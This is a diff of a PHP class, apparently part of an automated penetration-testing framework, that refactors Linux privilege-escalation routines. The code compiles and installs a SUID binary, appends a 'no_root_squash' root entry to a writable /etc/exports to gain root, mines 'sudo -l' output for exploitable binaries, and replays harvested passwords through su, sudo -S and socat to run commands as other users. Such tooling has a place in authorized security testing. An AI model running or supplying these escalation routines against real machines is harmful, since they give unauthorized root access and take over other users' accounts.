         $data = "gcc -m32 -o $this->vm_tmp_lin/suid $this->vm_tmp_lin/suid.c ";
-        //$this->lan2stream4result($data,$this->stream_timeout);
+        //$this->req_str($stream,$data,$this->stream_timeout,"");
         $this->req_ret_str($data);
         
         $this->pause();
         
         $data = "chmod u+s $this->vm_tmp_lin/suid ";
-        //$this->lan2stream4result($data,$this->stream_timeout);
+        //$this->req_str($stream,$data,$this->stream_timeout,"");
         $this->req_ret_str($data);
         
         $data = "ls -al $this->vm_tmp_lin/suid ";
-        //$this->lan2stream4result($data,$this->stream_timeout);
+        //$this->req_str($stream,$data,$this->stream_timeout,"");
         $this->req_ret_str($data);
         
         $this->pause();
         
         $data = "chmod 4755 $this->vm_tmp_lin/suid ";
-        //$this->lan2stream4result($data,$this->stream_timeout);
+        //$this->req_str($stream,$data,$this->stream_timeout,"");
         $this->req_ret_str($data);
         
         $data = "ls -al $this->vm_tmp_lin/suid";
-        //$this->lan2stream4result($data,$this->stream_timeout);
+        //$this->req_str($stream,$data,$this->stream_timeout,"");
         $this->req_ret_str($data);
         
         $this->pause();
@@ -717,7 +736,7 @@ EOC;
         
         $template_id_euid = "$this->vm_tmp_lin/suid %ID%";
 
-        $this->lan2pentest8id($template_id_euid);
+        $this->pentest8id($stream,$template_id_euid);
 
         $this->pause();
         
@@ -726,7 +745,7 @@ EOC;
     }
     
     
-    public function misc2etc_exports(){
+    public function misc2etc_exports($stream){
         /*
          https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/
          https://guide.offsecnewbie.com/privilege-escalation/linux-pe
@@ -783,34 +802,34 @@ EOC;
         
         $this->note("How are file-systems mounted?");
         $data = "mount";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "cat /proc/mounts";
-        $lines = $this->lan2stream4result($data,$this->stream_timeout);
+        $lines = $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $this->note("Provides a list of mounted file systems.
 Can be used to determine where other interesting files might be located");
         $data = "cat /proc/mounts";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
 
         
         $this->note("The /etc/exports file lists all directories exported by Network File System (NFS).
 If /etc/exports if writable, you can add an NFS entry or change and existing entry adding the no_root_squash flag to a root directory, put a binary with SUID bit on, and get root.");
         $data = "grep -v -e '^$' /etc/exports | grep -v \"#\"  2> /dev/null ";
-        $result .= $this->lan2stream4result($data,$this->stream_timeout);
+        $result .= $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "grep -v -e '^$' /etc/exports | grep -v \"#\" | sed \"s/,root_squash/,no_root_squash/g\"  2> /dev/null ";
-        $result .= $this->lan2stream4result($data,$this->stream_timeout);
+        $result .= $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $etc_sudoers_path = "/etc/exports";
         $obj_filename = new FILE($etc_sudoers_path);
-        $whoami = $this->lan2whoami();
+        $whoami = $this->whoami();
         
         $search_data = '/  *(rw, no_root_squash)';
-        if ($this->lan2file4writable($obj_filename->file_path)){
-            if (!$this->lan2file4search($obj_filename->file_path, $search_data)){
-                $result .= $this->lan2file4add($obj_filename->file_path, $search_data);
+        if ($this->file4writable($obj_filename->file_path)){
+            if (!$this->file4search($obj_filename->file_path, $search_data)){
+                $result .= $this->file4add($obj_filename->file_path, $search_data);
                 $result .= $this->misc2etc_exports2setsuid("/");
             }
             $result .= $this->users4root($whoami, '');
@@ -828,31 +847,34 @@ If /etc/exports if writable, you can add an NFS entry or change and existing ent
     
     
     
-    public function users(){
+    public function users($stream){
         $this->titre(__FUNCTION__);
         $users_passwd = $this->ip2users4passwd();
-        $tab_users_shell = $this->ip2users4shell();
+        
         foreach ($users_passwd as $user2name => $user2pass){
             if (!empty($user2name)) {
-                if (!$this->ip2root8db($this->ip2id)) $this->users2sudoers8filepath($this->users2sudoers2list($user2name, $user2pass));
+                if (!$this->ip2root8db($this->ip2id)) $this->users2sudoers8filepath($stream,$this->users2sudoers2list($stream,$user2name, $user2pass));
                 
-                foreach ($tab_users_shell as $user2name_shell)
-                    if (!empty($user2name_shell)) {
-                        if (!$this->ip2root8db($this->ip2id)) $this->users2sudoers8filepath($this->users2sudoers2list($user2name_shell, $user2pass));
-                    }
+
             }
         }
         $this->pause();
-
-        $this->users4user();
-        $this->users4pass();        
+        
+        $tab_users_shell = $this->ip2users4shell();
+        foreach ($tab_users_shell as $user2name_shell)
+            if (!empty($user2name_shell)) {
+                if (!$this->ip2root8db($this->ip2id)) $this->users2sudoers8filepath($stream,$this->users2sudoers2list($stream,$user2name_shell, ""));
+            }
+        
+        $this->users4user($stream);
+        $this->users4pass($stream);        
     }
     
     
     
     
     
-    public function users2sudoers2list($user_name,$user_pass){
+    public function users2sudoers2list($stream,$user_name,$user_pass){
         $this->titre("Linux Privilege Escalation using Sudo Rights");
         $result = "";
         $this->ssTitre("sudo -l – Prints the commands which we are allowed to run as SUDO ");
@@ -868,7 +890,7 @@ If /etc/exports if writable, you can add an NFS entry or change and existing ent
     
     
     
-    public function users2sudoers8filepath($sudoers_str){
+    public function users2sudoers8filepath($stream,$sudoers_str){
         $result = "";
         $this->ssTitre(__FUNCTION__);
         $data = "echo '$sudoers_str' | grep -E \"\([a-zA-Z0-9_\-]{1,}\)\" | cut -d')' -f2  | grep -Po \"[[:space:]]{1}/[a-z0-9\-_]{1,}/[[:print:]]{1,}\"  | grep -Po \"(/[a-z0-9\-\_]{1,}(/[a-z0-9\-\_\.]{1,})+)\"  ";
@@ -885,9 +907,9 @@ If /etc/exports if writable, you can add an NFS entry or change and existing ent
             if (!empty($app)) {
                 
                 $this->article("$i/$size", $app);
-                if (!$this->ip2root8db($this->ip2id)) $this->lan2root8bin($app, TRUE, '');$this->pause();
-                if (!$this->ip2root8db($this->ip2id)) $this->suids4one($app);$this->pause();
-                if (!$this->ip2root8db($this->ip2id)) $this->suids8env2path2xtrace($app);$this->pause();
+                if (!$this->ip2root8db($this->ip2id)) $this->root8bin($stream,$app, TRUE, '');$this->pause();
+                if (!$this->ip2root8db($this->ip2id)) $this->suids4one($stream,$app);$this->pause();
+                if (!$this->ip2root8db($this->ip2id)) $this->suids8env2path2xtrace($stream,$app);$this->pause();
             }
         }
         return $result;
@@ -896,7 +918,7 @@ If /etc/exports if writable, you can add an NFS entry or change and existing ent
     
     
     
-    public function users4user(){
+    public function users4user($stream){
         $this->ssTitre(__FUNCTION__);
                 $users_passwd = $this->ip2users4passwd();
         foreach ($users_passwd as $user2name => $user2pass){
@@ -909,31 +931,20 @@ If /etc/exports if writable, you can add an NFS entry or change and existing ent
     
     
     
-    public function users2user($user_name,$user_pass){
+    public function users2user($stream,$user_name,$user_pass){
         $this->ssTitre(__FUNCTION__);
-        /*
-         #!/usr/bin/expect -f
-         #Usage: runas.sh cmd user pass
-         
-         set cmd [lindex $argv 0];
-         set user [lindex $argv 1];
-         set pass [lindex $argv 2];
-         
-         log_user 0
-         spawn su -c $cmd - $user
-         expect "Password: "
-         log_user 1
-         send "$pass\r"
-         expect "$ "
-         */
         $user_name = trim($user_name);
         $user_pass = trim($user_pass);
         
-        //$template_id_euid = "( sleep $this->stream_timeout*3 ;echo $user_pass; sleep 5;) |  socat - EXEC:\"su --login $user_name --shell $shell --command %ID%\",pty,stderr,setsid,sigint,ctty,sane";
-        $template_id_euid = "(echo '$user_pass';sleep 1;) |  su --login '$user_name' --shell /bin/bash --command '%ID%' 2>1 ";
-        $this->lan2pentest8id($template_id_euid);
-        $template_id_euid = "echo '$user_pass' | sudo -S su --login '$user_name' --shell /bin/bash --command '%ID%' 2>1 ";
-        $this->lan2pentest8id($template_id_euid);
+        $template_id_euid = "( sleep $this->stream_timeout ;echo $user_pass; sleep 5;) |  socat - EXEC:\"su $user_name -c '%ID%'\",pty,stderr,setsid,sigint,ctty,sane";
+        $this->pentest8id($stream,$template_id_euid);
+        $template_id_euid = "(sleep 1;echo '$user_pass';sleep 1;) |  su $user_name -c '%ID%'  ";
+        $this->pentest8id($stream,$template_id_euid);
+        $template_id_euid = "echo '$user_pass' | sudo -S su $user_name -c '%ID%'  ";
+        $this->pentest8id($stream,$template_id_euid);
+        
+
+   
         
     }
     
